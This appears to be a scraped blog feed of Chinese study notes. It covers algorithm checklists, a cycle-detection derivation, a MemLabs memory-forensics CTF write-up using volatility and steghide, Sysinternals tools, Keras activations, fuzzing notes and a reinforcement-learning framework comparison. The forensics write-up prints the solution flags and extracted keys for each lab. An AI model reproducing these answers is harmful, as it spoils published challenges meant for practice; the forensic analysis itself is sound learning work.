二叉树的下一个结点：https://www.nowcoder.com/practice/9023a0c988684a53960365b889ceaf5e [ ] 数据流中的中位数：https://www.nowcoder.com/practice/9be0172896bd43948f8a32fb954e1be1 [ ] 二叉搜索树的第k个结点：https://www.nowcoder.com/practice/ef068f602dde4d28aab2b210e859150a [ ] 按之字形顺序打印二叉树：https://www.nowcoder.com/practice/91b69814117f4e8097390d107d2efbe0 [ ] 完全平方数（279）：https://leetcode-cn.com/problems/perfect-squares/ 从n到0每个数字表示1个结点，相差1个完全平方数的结点有边，找0到n的最短路径 [ ] 电话号码的字母组合（17）：https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/ Week 5机器学习 前向神经网络 前向传播 反向传播 序列数据中常用的循环神经网络 RNN GRU和LSTM 算法 递归 记忆化搜索 跳台阶 (509) 变态跳台阶 (牛客) 回溯法（反向递归树） 递归一定会发生回溯 暴力搜索 全排列 (46) 恢复标志位 机器人运动范围 (面试题13) 动态规划DP 保存子问题的答案 自下而上（与记忆化搜索相反） 0/1背包问题 (416. 分割等和子集) 挑选的物品只有一个 该物品可选可不选 状态 dp[i][j] 挑选第i个物品放入j容量的最大价值 状态转移方程 空间：$O(nC)$ -&gt; $O(2C)$（只保留上一行）-&gt; $O(C)$（倒序更新） 时间：$O(nC)$ 物品数量背包容量 最长上升子序列LIS (300) dp[i] 以第i个数字结尾的LIS长度 dp[i] = max([dp[j] + 1 for j in range(i) if nums[i] &gt; nums[j]] + [1]) 最长公共子序列LCS (1143) dp[i][j] s1的前i个字符和s2的前j的字符的LCS的大小 dp[i][j] = dp[i-1][j-1]+1 s1[i] == s2[j] dp[i][j] = max(dp[i-1][j], dp[i][j-1]) s1[i] != s2[j] 题目算法刷题重点题型递归、回溯问题： [ ] 斐波那契数列：https://www.nowcoder.com/practice/c6c7742f5ba7442aada113136ddea0c3 [ ] 跳台阶：https://www.nowcoder.com/practice/8c82a5b80378478f9484d87d1c5f12a4 [ ] 变态跳台阶：https://www.nowcoder.com/practice/22243d016f6b47f2a6928b4313c85387 [x] 全排列（46）：https://leetcode-cn.com/problems/permutations/ [ ] 机器人的运动范围：https://www.nowcoder.com/practice/6e5207314b5241fb83f2329e89fdecc8 动态规划问题： [x] 斐波那契数列（用DP方法再写一下）（70）：https://leetcode-cn.com/problems/climbing-stairs [x] 0-1 背包（416）：https://leetcode-cn.com/problems/partition-equal-subset-sum [x] 最长递增子序列（300）：https://leetcode-cn.com/problems/longest-increasing-subsequence [x] 最长公共子序列（1143）：https://leetcode-cn.com/problems/longest-common-subsequence/ 算法刷题课后作业 [ ] 矩阵中的路径：https://www.nowcoder.com/practice/c61c6999eecb4b8f88a98f66b273a3cc [ ] 矩形覆盖：https://www.nowcoder.com/practice/72a5a919508a4251859fb2cfb987a0e6 [ ] 矩阵路径（64）：https://leetcode-cn.com/problems/minimum-path-sum [ ] 股票交易（309）：https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown [ ] 字符串编辑（583）：https://leetcode-cn.com/problems/delete-operation-for-two-strings [ ] 数组区间（303）：https://leetcode-cn.com/problems/range-sum-query-immutable [ ] 分割整数（343）：https://leetcode-cn.com/problems/integer-break Week 6机器学习 集成学习 Bagging 随机森林 Boosting 梯度提升树 GBDT 残差：真实值 - 预测值 基分类器：回归树CART 加法模型：决策树相加 求解：前向分布算法 用负梯度代替残差 泰勒一阶展开 问题（不同的损失函数） 二分类 对数损失函数 初始值求解 Newton-Raphson一步迭代$\gamma_{jm}$ 多分类 交叉熵损失函数 回归 huber损失函数 平方损失函数 XGBoost 预备知识 泰勒二阶展开 结构风险极小化：正则化 结构分]]></content>
      <categories>
        <category>算法</category>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[环形链表公式推导（快慢指针）]]></title>
    <url>%2F2020%2F02%2F06%2F%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC%EF%BC%88%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88%EF%BC%89%2F</url>
    <content type="text"><![CDATA[LeetCode 142的关于快慢指针通用情况的公式推导 假设环存在，设$s$为慢指针，每次走一步；$f$为快指针，每次走2步。设2者在环中距离入口处$b$相遇，且出发点与环入口距离为$a$，环长度为$l$，并记$c=l-b$，则二者相遇时有：$$f=a+b+nl$$$$s=a+b+ml$$其中$n$、$m$为常数，表示快慢指针走过的圈数。由于快指针是慢指针2倍速度，则有：$$f=2s$$带入化解消去$b$得到：$$(n-2m-1)l=a-c$$即：$$l|a-c$$这样意味着慢指针从相遇点出发并经过$n-2m-1$圈后，与同时从起点出发的另一慢指针在环入口处相遇。]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MemLabs Memory Forensics Challenges]]></title>
    <url>%2F2020%2F01%2F10%2FMemLabs-Memory-Forensics-Challenges%2F</url>
    <content type="text"><![CDATA[MemLabs volatility使用说明 内存取证挑战，Lab1~6 Lab 1 Beginner’s LuckEasy12volatility -f MemoryDump_Lab1.raw imageinfo # 检测profile类型volatility -f MemoryDump_Lab1.raw --profile=Win7SP1x64 consoles # 获取cmd的指令和结果（cmdscan只包括cmd指令） 得到cmd的缓存中有St4G3$1的运行结果ZmxhZ3t0aDFzXzFzX3RoM18xc3Rfc3Q0ZzMhIX0解码得到flag{th1s_1s_th3_1st_st4g3!!}。 内存数据通过DumpIt.exe获取。 Lab 2 A New WorldEasy1volatility -f MemoryDump_Lab2.raw --profile=Win7SP1x64 envars # 查看环境变量 存在NEW_TMP环境变量，值为C:\Windows\ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9，解码得到flag{w3lc0m3_T0_$T4g3_!_Of_L4B_2}。 Lab 3 The Evil’s DenInCTF 2018 Evil Crypter Easy - Medium1234volatility -f MemoryDump_Lab3.raw imageinfo # Win7SP1x86volatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 iehistory # ie浏览器历史，在Desktop目录下有可疑文件suspision1.jpeg、evilscript.py.py和vip.txtvolatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 filescan # 扫描文件，获取文件对应的Offsetvolatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 dumpfiles -D ./files -Q 0x000000003e727e50 -n # 提取vip.txt，其余文件同理 第一部分根据evilscript.py.py（先xor(3)后base64）和加密结果vip.txt可以逆向得到inctf{0n3_h4lf；根据提示使用steghide extract -sf suspision1.jpeg提取suspision1.jpeg中的隐藏信息，密码为inctf{0n3_h4lf，得到第二部分_1s_n0t_3n0ugh}，即为inctf{0n3_h4lf_1s_n0t_3n0ugh}。 Lab 4 ObsessionJust Do It - InCTF Internationals 2019 Medium123volatility -f MemoryDump_Lab4.raw imageinfo # Win7SP1x64volatility -f MemoryDump_Lab4.raw --profile=Win7SP1x64 iehistory # 发现Important.txt但无法dumpfilesvolatility -f MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser &gt; mftparse # 利用MFT查看Important.txt Important.txt已被删除，无法通过dumpfiles获取。使用mftparser检查NTFS的主控文件表MFT的$DATA属性（每个MFT表项为1024字节），参考OMFW 2012: Reconstructing the MBR and MFT from Memory。最后在mftparse中得到inctf{1_is_n0t_EQu4l_7o_2_bUt_th1s_d0s3nt_m4ke_s3ns3}。 Lab 5 Black TuesdayMedium - Hard1234volatility -f MemoryDump_Lab5.raw imageinfo # Win7SP1x64volatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 iehistoryvolatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 filescan # SW1wb3J0YW50.rarvolatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 dumpfiles -D ./files -Q 0x000000003eed56f0 -n 在iehistory中找到记录C:/Windows/AppPatch/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfNV9EMG4zXyEhfQ.bmp，base64解密得到flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}。在filescan中找到记录\Device\HarddiskVolume2\Users\SmartNet\Documents\SW1wb3J0YW50.rar，dumpfiles下来后使用上一flag作为密码解压，得到Stage2.png，得到第二个flag，为flag{W1th_th1s_$taGe_2_1s_c0mPL3T3_!!}。 Lab 6 The ReckoningInCTF 2019 - Notch It Up Hard12345volatility -f MemoryDump_Lab6.raw imageinfo # Win7SP1x64volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 iehistoryvolatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 filescan # flag.rar Historyvolatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 pstree # WinRAR.exe 3716volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 envars -p 3716 # RAR password easypeasyvirus 查看WinRAR.exe的环境变量发现密码，解密flag.rar得到flag2.png，为aN_Am4zING_!_i_gU3Ss???_}。 12volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 dumpfiles -D ./files -Q 0x000000005da5a610 -n # History.vacb History.datvolatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 screenshot -D ./screenshot 检查Chrome的\User Data\Default\History，获得sqlite3数据库文件History.dat，查找记录sqlite3 History.dat &quot;select url from urls;&quot;发现可疑网址https://pastebin.com/RSGSi1hk。 里面有一Google文档的地址，打开后为一大段拉丁语文字，中间有一个MEGA链接，但是存在密码保护。搜索整个内存cat MemoryDump_Lab6.raw.strings | grep -i mega | grep -i key，发现THE KEY IS zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU即为下载密钥，获得flag_.png，为另一半flag：inctf{thi5_cH4LL3Ng3_!s_g0nn4_b3_?_。 （也可以通过screenshot获取浏览器标题然后再搜索） inctf{thi5_cH4LL3Ng3_!s_g0nn4_b3_?_aN_Am4zINg_!_i_gU3Ss???_}]]></content>
  </entry>
  <entry>
    <title><![CDATA[SysinternalsSuite工具使用总结]]></title>
    <url>%2F2020%2F01%2F10%2FSysinternalsSuite%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[SysinternalsSuite一共有76款实用工具程序，部分程序有32和64位之分。 -accepteula可以避免第一次运行时弹出的提示。 名称 功能 1 accesschk(64) 2 AccessEnum 3 ADExplorer 4 ADInsight 5 adrestore 6 Autologon 7 Autoruns(64) 8 autorunsc(64) 9 Bginfo(64) 10 Cacheset 11 Clockres(64) 12 Contig(64) 13 Coreinfo 查看CPU信息，-v查看CPU对虚拟化的支持，需要管理员权限 14 ctrl2cap 15 Dbgview 查看DbgPrint()的输出，捕获kernel需要管理员权限 16 Desktops 17 disk2vhd 18 diskext(64) 19 Diskmon 20 DiskView 21 du(64) 22 efsdump 23 FindLinks(64) 24 handle(64) 25 hex2dec(64) 26 junction(64) 27 ldmdump 28 Listdlls(64) Listdlls64.exe -v chrome 列出已启动程序加载的DLL 29 livekd(64) 30 LoadOrd(64) 31 LoadOrdC(64) 32 logonsessions(64) 33 movefile(64) 34 notmyfault(64) 35 notmyfaultc(64) 36 ntfsinfo(64) 37 pagedfrg 38 pendmoves(64) 39 pipelist(64) 40 portmon 41 procdump(64) Procdump64.exe -ma 6276 firefox-6276.dmp dump进程内存空间 42 procexp(64) 查看系统进程信息 43 Procmon 根据设定的过滤条件监控进程的各种行为 44 PsExec(64) 45 psfile(64) 46 PsGetsid(64) 47 PsInfo(64) 48 pskill(64) 49 pslist(64) 50 PsLoggedon(64) 51 psloglist(64) 52 pspasswd(64) 53 psping(64) 54 PsService(64) 55 psshutdown 56 pssuspend(64) 57 RAMMap 58 RegDelNull(64) 59 regjump 60 ru(64) 61 sdelete(64) 62 ShareEnum 63 ShellRunas 64 sigcheck(64) 65 streams(64) 66 strings(64) strings.exe –o -accepteula win7.dd类似于Linux下的strings -a -td win7.dd，以&lt;decimal_offset&gt;:&lt;string&gt;的格式输出二进制文件中的字符串 67 sync(64) 68 Sysmon(64) 69 Tcpvcon 70 Tcpview 71 Testlimit(64) 72 vmmap 73 Volumeid(64) 74 whois(64) 75 Winobj 查看内核对象和命名空间，比如驱动 76 ZoomIt]]></content>
      <categories>
        <category>经验总结</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[keras预定义激活函数]]></title>
    <url>%2F2020%2F01%2F04%2Fkeras%E9%A2%84%E5%AE%9A%E4%B9%89%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Available activations Activation function keras常见预定义激活函数公式定义 softmax$(0, 1)$ $$S_i=\frac{e^i}{\sum_je^j}$$ elu$(-1, +\infin)$ $$f(x)=\begin{cases}x &amp; x \geq 0 \\alpha(e^x-1) &amp; x &lt; 0\end{cases}$$ selu$(-\lambda\alpha, +\infin)$ 李宏毅课程：SELU 激活函数 $$f(x)=\lambda\begin{cases}x &amp; x \geq 0 \\alpha(e^x-1) &amp; x &lt; 0\end{cases}$$ $\alpha = 1.6732632423543772848170429916717$ $\lambda = 1.0507009873554804934193349852946$ softplus$(0, +\infin)$ $$f(x)=ln(1+e^x)$$ softsign$(-1, 1)$ $$f(x)=\frac{x}{1+|x|}$$ relu$[0, +\infin]$ $$f(x)=max(0,x)$$ tanh$[-1, 1]$ $$tanhx=\frac{sinhx}{coshx}=\frac{e^x-e^{-x}}{e^x+e^{-x}}$$ sigmoid$(0, 1)$ $$f(x)=\frac{1}{1+e^{-x}}$$ hard_sigmoid$[0 ,1]$ $$f(x)=\begin{cases}0 &amp; x &lt; -2.5 \0.2x+0.5 &amp; -2.5 \leq x \leq 2.5\1 &amp; x &gt; 2.5\end{cases}$$ linearInput tensor, unchanged.]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模糊测试相关资料收集]]></title>
    <url>%2F2019%2F12%2F29%2F%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[搜集一些模糊测试相关的资料，包括最初来源，可以用于论文引用。 Technical “whitepaper” for afl-fuzz AFL技术白皮书 Design statement Coverage measurements branch (edge) coverage provides considerably more insight into the execution path of the program than simple block coverage coarse branch-taken hit counts shared_mem[] 64 kB SHM Every byte : a hit for a particular (branch_src, branch_dst) tuple Detecting new behaviors Evolving the input queue Culling the corpus Trimming input files Fuzzing strategies Dictionaries De-duping crashes Investigating crashes The fork server copy-on-write Parallelization Binary-only instrumentation The afl-analyze tool]]></content>
      <categories>
        <category>模糊测试</category>
      </categories>
      <tags>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见强化学习框架比较]]></title>
    <url>%2F2019%2F12%2F24%2F%E5%B8%B8%E8%A7%81%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[A Comparison of Reinforcement Learning Frameworks: Dopamine, RLLib, Keras-RL, Coach, TRFL, Tensorforce, Coach and more （原文中的视频和谷歌趋势图可到原文中查看） 文中未涉及的框架： Baselines rlpyt PS 有一篇相关论文A Survey on Deep Reinforcement Learning Libraries，韩文 Reinforcement Learning (RL) frameworks help engineers by creating higher level abstractions of the core components of an RL algorithm. This makes code easier to develop, easier to read and improves efficiency. But choosing a framework introduces some amount of lock in. An investment in learning and using a framework can make it hard to break away. This is just like when you decide which pub to visit. It’s very difficult not to buy a beer, no matter how bad the place is. In this post I provide some notes about the most popular RL frameworks available. I also present some crude summary statistics from Github and Google (which you can’t trust) to attempt to quantify their popularity. I believe posts like this are useful, but sometimes people are upset because I don’t like something about their framework. I do not want to upset anyone. If I do, I’m sorry. The work performed by the framework authors is nothing less than extraordinary. This is my meagre interpretation using the little time I have available. Please contact me to make corrections. Original Purpose of this WorkI am writing a book on RL for O’Reilly. As a part of that book, I want to demonstrate to my readers how to build and design various RL agents. I think the readers will benefit by using code from an already-established framework or library. And in any case, the people writing these frameworks would probably do a better job than I could anyway. So the question was, “which framework?”. Which led me down this path. It started with a few frameworks, but then I found more. And more. And it turns out there are quite a lot of frameworks already available, which turned this into a 8000 word monster. Apologies in advance for the length. I don’t expect many people to read all of it! Because of the length, this also took a while to write. This means that the reviews don’t have laser-focus. Sometimes I comment about one thing in one framework and not at all in another. Apologies for this; it was not intended to be exhaustive. MethodologyMost of the evaluation is pure opinion. But there are a few quantitative metrics we can look at. Namely the statistics of the repository that are made available in Github. Starts roughly represent how well known each of the frameworks are, but they do not represent quality. More often than not the frameworks with the most stars have more marketing power. After that, I was looking for a combination of modularity, ease of use, flexibility and maturity. Simplicity was also desired, but this is usually mutually exclusive with modularity and flexibility. The opinions presented below are based upon these ideals. One reoccurring theme is the dominance of Deep Learning (DL) frameworks within the RL framework. Quite often the DL framework would breakout above the abstractions and the RL framework would just be an extension of the former. This means that if you are in a situation where you are already in bed with a particular DL solution, then you might as well stick with that. But to me, that represents lock-in. My preference would always tend towards the frameworks that don’t mandate a specific DL implementation or don’t use DL at all (shock/horror!). The result is that all the Google frameworks tend towards Tensorflow, all the academic frameworks use PyTorch then there are a few brave souls dangling in-between with twice as much work as everyone else. I also attempted to look at the Google rankings for each framework, but that turned out to be unreliable. Accompanying NotebookWhere I could, or where it made sense, I tried out a lot of these frameworks. Many of them didn’t work. And some of them had excellent Notebooks to begin with, so you can just check those out. For the rest, I have published a gist that you can run on Google Colabratory. This is presented in a very raw format. It is not meant to be comprehensive or explanatory. I simply wanted to double check that in the simplest of cases, it worked. In each section I also present a “Getting Started” sub-heading that demonstrates the basic example from each framework. This code is from the Notebook. Reinforcement Learning FrameworksThe following frameworks are listed in order of the number of stars in their Github repository as of June 2019. The actual number of stars and other metrics are presented as badges just below the title of each framework. The following frameworks are compared: OpenAI Gym Google Dopamine RLLib Keras-RL TRFL Tensorforce Facebook Horizon Nervana Systems Coach MAgent SLM-Lab DeeR Garage Surreal RLgraph Simple RL OpenAI Gym OpenAI is a not-profit, pure research company. The provide a range of open-source Deep and Reinforcement Learning tools to improve repeatability, create benchmarks and improve upon the state of the art. I like to think of them as a bridge between academia and industry. But I know what you’re thinking. “Phil, Gym is not a framework. It is an environment.”. I know, I know. It provides a range of toy environments, classic control, robotics, video games and board games to test your RL algorithm against. But I have included it here because it is used so often as the basis for custom work. People use it like a framework. Think of it as an interface between an RL implementation and the environment. It is so prolific, many of the other frameworks listed below also interface with Gym. Furthermore it acts as a baseline as to compare everything against. Since this is one of the most popular repositories in RL. Getting StartedGym is both cool and problematic because of it’s realistic 3D environments. If you want to visualise what is going on you need to be able to render these environments. It pretty much works on your laptop, but struggles when you try and run it in a Notebook because of limitations with the browser. To work around this, you have to use a virtual display. Basically we have to mock out the video driver. This means most of the “getting started” code is video wrapping code. If we ignore all the boring stuff, which you can find in the accompanying Notebook, the core gym code looks like: 1234567891011121314import gymfrom gym.wrappers.monitoring.video_recorder import VideoRecorder # Because we want to record a videoenv = gym.make("CartPole-v1") # Create the cartpole environmentrec = VideoRecorder(env) # Create the video recorderrec.capture_frame() # Capture the starting positionwhile True: action = env.action_space.sample() # Use a random action observation, reward, done, info = env.step(action) # to take a single step in the environment rec.capture_frame() # and record if done: break # If the pole has fallen, quit.rec.close() # Close the recordingenv.close() # Close the environment As you can see, it falls straight away because we’re just passing random actions at the moment. But still, there’s something hypnotic, something drum-and-bass about it. But now let’s look at some agent framework only options. Google Dopamine Google Dopamine: “Not an Official Google product” (NOGP - an acronym I’m going to coin now) but written by Google employees and hosted on Google github. So, Google Dopamine then. It is a relatively new entrant to the RL framework space that appears to have been a hit. It boasts a large number of Github stars and some amount of Google trend ranking. This is especially surprising because of the limited number of commits, committers and time since the project was launched. Clearly it helps you have Google’s branding and marketing department. Anyway, the cool thing about this framework is that it emphasises configuration as code through it’s use of the Google gin-config configuration framework. The idea is that you have lots of pluggable bits that you plumb together through a configuration file. The benefit is that this allows people to release a single configuration file that contains all of the parameters specific to that run. And gin-config makes things special because it allows you to plumb together objects; instances of classes and lambdas and things like that. The downside is that you increase the complexity in the configuration file and it can end up like just another file full of code that people can’t understand because they are not used to it. Personally I would always stick to a “dumb” configuration file like Kubernetes Manifests or JSON (like many of the other frameworks), for example. The wiring should be done in the code. The one major benefit is that it promotes plugability and reuse, which are key OOP and Functional concepts that are often ignored when developing Data Science products. It is clear that it has gained a significant amount of traction in a very short time. And frankly, that worries me a bit. There are four contributors and only 100 commits. Of those four people, three are from the community (bug-fixes, etc.). This leaves one person. And this one person has committed, wait for it, over 1.3 million lines of code. Clearly there’s something fishing going on here. From the commit history it looks like the code was transferred from another repo. A 1.2 million line commit isn’t exactly best practice! :-) It’s Apache licensed, so there’s nothing too strange going on but the copyright has been assigned to Google Inc.. But I’m reassured by the contributor agreement. In terms of modularity, there isn’t much. There isn’t any abstraction for the Agents; they are implemented directly and configured from the gin config. There’s not many implemented either. There isn’t any official abstraction of an environment either. In fact, it looks like they are just passing back core Tensorflow objects everywhere and assuming using the Tensorflow interface. In short, very little official OOP-style abstraction, which is different to most of the other frameworks. In short, little modularity, reuse is clunky (IMO) and although it appears to be popular, it isn’t very mature and doesn’t have community support. Getting StartedAgain you can find the example in the accompanying Notebook, but the premise is to build your RL algorithm via a configuration file. This is what it looks like: 12345678910111213141516171819202122232425262728293031323334353637383940DQN_PATH = os.path.join(BASE_PATH, 'dqn')# Modified from dopamine/agents/dqn/config/dqn_cartpole.gindqn_config = """# Hyperparameters for a simple DQN-style Cartpole agent. The hyperparameters# chosen achieve reasonable performance.import dopamine.discrete_domains.gym_libimport dopamine.discrete_domains.run_experimentimport dopamine.agents.dqn.dqn_agentimport dopamine.replay_memory.circular_replay_bufferimport gin.tf.external_configurablesDQNAgent.observation_shape = %gym_lib.CARTPOLE_OBSERVATION_SHAPEDQNAgent.observation_dtype = %gym_lib.CARTPOLE_OBSERVATION_DTYPEDQNAgent.stack_size = %gym_lib.CARTPOLE_STACK_SIZEDQNAgent.network = @gym_lib.cartpole_dqn_networkDQNAgent.gamma = 0.99DQNAgent.update_horizon = 1DQNAgent.min_replay_history = 500DQNAgent.update_period = 4DQNAgent.target_update_period = 100DQNAgent.epsilon_fn = @dqn_agent.identity_epsilonDQNAgent.tf_device = '/gpu:0' # use '/cpu:*' for non-GPU versionDQNAgent.optimizer = @tf.train.AdamOptimizer()tf.train.AdamOptimizer.learning_rate = 0.001tf.train.AdamOptimizer.epsilon = 0.0003125create_gym_environment.environment_name = 'CartPole'create_gym_environment.version = 'v0'create_agent.agent_name = 'dqn'TrainRunner.create_environment_fn = @gym_lib.create_gym_environmentRunner.num_iterations = 100Runner.training_steps = 100Runner.evaluation_steps = 100Runner.max_steps_per_episode = 200 # Default max episode length.WrappedReplayBuffer.replay_capacity = 50000WrappedReplayBuffer.batch_size = 128"""gin.parse_config(dqn_config, skip_unknown=False) That’s quite a lot. But it’s implementing a more complicated algorithm so we might expect that. I’m quite happy about the hyperparameters being in there, but I’m not sure that I am a fan of all the dynamic injection (the @ denotes an instance of a class). Proponents would say that “wow, look, I can just swap out the optimiser just by changing this line”. But I’m of the opinion that I could do that with plain old Python too. After a bit of training: 123tf.reset_default_graph()dqn_runner = run_experiment.create_runner(DQN_PATH, schedule='continuous_train')dqn_runner.run_experiment() Then we can run some similar code to before to generate a nice video: 123456789101112rec = VideoRecorder(dqn_runner._environment.environment)action = dqn_runner._initialize_episode()rec.capture_frame()while True: observation, reward, is_terminal = dqn_runner._run_one_step(action) rec.capture_frame() if is_terminal: break # If the pole has fallen, quit. else: action = dqn_runner._agent.step(reward, observation)dqn_runner._end_episode(reward)rec.close() RLLib via ray-project Ray started life as a project that aimed to help Python users build scalable software, primarily for ML purposes. Since then it has added several modules that are dedicated to specific ML use cases. One is distributed hyperparameter tuning and the other is distributed RL. The consequence of this generalisation is that the popularity numbers are probably more due to the hyperparameter and general purpose scalability use case, rather than RL. Also, the distributed focus of the library means that the agent implementations tend to be those that are inherently distributed (e.g. A3C) or are attempting to solve problems that are so complex they need distributing so that they don’t take years to converge (e.g. Rainbow). Despite this, if you are looking to productionise RL, or if you are repeating training many times for hyperparameter tuning or environment improvements, then it probably makes sense to use ray to be able to scale up and reduce feedback times. In fact, a number of other frameworks (specifically: SLM-Lab and RLgraph) actually use ray under the hood for this purpose. I believe there is a strong applicability to RL here. The clear focus on distributed computation is good.The sheer number of commits and contributors is also reassuring. But there is a lot of the underlying code in C++. Some even in Java. Only 60% is python. Despite this there is a very clear abstraction for Policys, a nice, almost functional interface for agents called Trainers (see the DQN implementation for an example of its usage), a Model abstraction that allows the use of PyTorch or Tensorflow (yay!) and a few more for evaluation and policy optimisation. Overall the documentation is excellent and clear architectural drawings are presented (see this example, for example). It is modular, scales well and is very well supported and accepted by the community. The only downside is the complexity of it all. That’s the price you pay for all this functionality. Getting StartedThere is an issue with the version of pyarrow preinstalled in Google colab that isn’t compatible with ray. You have to uninstall the preinstalled version and restart the runtime, then it works. I also couldn’t get the video rendering working in the same way we made the previous examples work. My hypothesis is that because they are running in separate processes they don’t have access to the fake pyvirtualdisplay device. So despite this, let us try an example: 12!pip uninstall -y pyarrow!pip install tensorflow ray[rllib] &gt; /dev/null 2&gt;&amp;1 After you remove pyarrow and install rllib, you must restart the Notebook kernel. Next, import ray: 1234import rayfrom ray import tuneray.init() And run a hyperparameter tuning job for the Cartpole environment using a DQN: 1234567891011tune.run( "DQN", stop=&#123;"episode_reward_mean": 100&#125;, config=&#123; "env": "CartPole-v0", "num_gpus": 0, "num_workers": 1, "lr": tune.grid_search([0.01, 0.001, 0.0001]), "monitor": False, &#125;,) There is a lot of syntactic sugar here, but it looks reasonably straightforward to customise the training functionality (docs). Keras-RL I love Keras. I love the abstraction, the simplicity, the anti-lock-in. When you look at the code below you can see the Keras magic. So you would think that keras-rl would be a perfect fit. However it doesn’t seem to have obtained as much traction as the other frameworks. If you look at the documentation, it’s empty. When you look at the commits there only a few brave souls that have done most of the work. Compare this to the main Keras project. And I think I might know why. Keras was built from the ground up to allow users to quickly prototype different DL structures. This relied on the fact that the Neural Network primitives could be abstracted and modular. But when you look at the code for keras-rl, it’s implemented like it is in the textbooks. Each agent has it’s own implementation despite the similarities between SARSA and DQN, for example. Think of all the “tricks” that could be modularised, tricks like those that are used for Rainbow, which could allow people to experiment using these tricks in other agents. There is some level of modularity, but I think it is at a level that is too high. But maybe it’s not too late, because there is so much promise here. If there were enough people interested, or maybe if there was more support from the core Keras project, then maybe this could be the go-to RL framework of the future. But for now, I don’t think it is. It’s almost as easy to obtain the benefits of Keras by using other frameworks that we have already discussed. Getting StartedThe examples worked out of the box here and the only modifications I made were to use a mock Display and add some video recording of the tests. You can see that most of the code here is standard Keras code. The additions by Keras-RL aren’t really Keras related at all. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import numpy as npimport gymfrom keras.models import Sequentialfrom keras.layers import Dense, Activation, Flattenfrom keras.optimizers import Adamfrom rl.agents.dqn import DQNAgentfrom rl.policy import BoltzmannQPolicyfrom rl.memory import SequentialMemoryENV_NAME = 'CartPole-v0'# Get the environment and extract the number of actions.env = gym.make(ENV_NAME)np.random.seed(123)env.seed(123)nb_actions = env.action_space.n# Next, we build a very simple model.model = Sequential()model.add(Flatten(input_shape=(1,) + env.observation_space.shape))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(nb_actions))model.add(Activation('linear'))print(model.summary())# Finally, we configure and compile our agent. You can use every built-in Keras optimizer and# even the metrics!memory = SequentialMemory(limit=5000, window_length=1)policy = BoltzmannQPolicy()dqn = DQNAgent(model=model, nb_actions=nb_actions, memory=memory, nb_steps_warmup=10, target_model_update=1e-2, policy=policy)dqn.compile(Adam(lr=1e-3), metrics=['mae'])# Okay, now it's time to learn something! We visualize the training here for show, but this# slows down training quite a lot. You can always safely abort the training prematurely using# Ctrl + C.dqn.fit(env, nb_steps=2500, visualize=True, verbose=2)# After training is done, we save the final weights.dqn.save_weights('dqn_&#123;&#125;_weights.h5f'.format(ENV_NAME), overwrite=True)# Finally, evaluate our algorithm for 5 episodes.dqn.test(Monitor(env, '.'), nb_episodes=5, visualize=True) TRFL TRFL is an opinionated extension to Tensorflow by Deepmind (so NOGP then ;-) ). Given the credentials you would have expected it to be popular, but the first thing you notice is the distinct lack of commits. Then the distinct lack of examples and Tensorflow 2.0 support. The main issue is that it is too low-level. It’s the exact opposite of Keras-RL. The functionality that TRFL provides is a few helper functions, a q-learning value function for example, which takes in a load of Tensorflow Tensors with abstract names. Getting StartedI recommend taking a quick look at this Notebook as an example. But note that the code is very low level. Tensorforce Tensorforce has similar aims to TRFL. It attempts to abstract RL primitives whilst targeting Tensorflow. By using Tensorflow then you gain all of the benefits of using Tensorflow, i.e. graph models, easier, cross-platform deployment. There are four high-level abstractions of an Environment, Runner, Agent and Model. These mostly do what you would expect, but the “Model” abstraction is not something you would normally see. A Model sits within an Agent and defines the policy of the agent. This is nice because, for example, the standard Q-learning model can be overridden by the Q-learning n-step model, only changing one small function. This is precisely the middle ground between TRFL and Keras that I was looking for. And it’s implemented in an OOP way, which some people will like, others wont. But at least the abstraction is there. The downside of libraries like this, or any DL focused RL library, is that much of the code is complicated by the underlying DL framework. The same is true here. For example, the random model, i.e. one that chooses a random action, something that should take precisely one line of code, is 79 lines long. I’m being a little facetious here (license, class boilerplate, newlines, etc.) but hopefully you understand my point. It also means that there is no implementation of “simple” 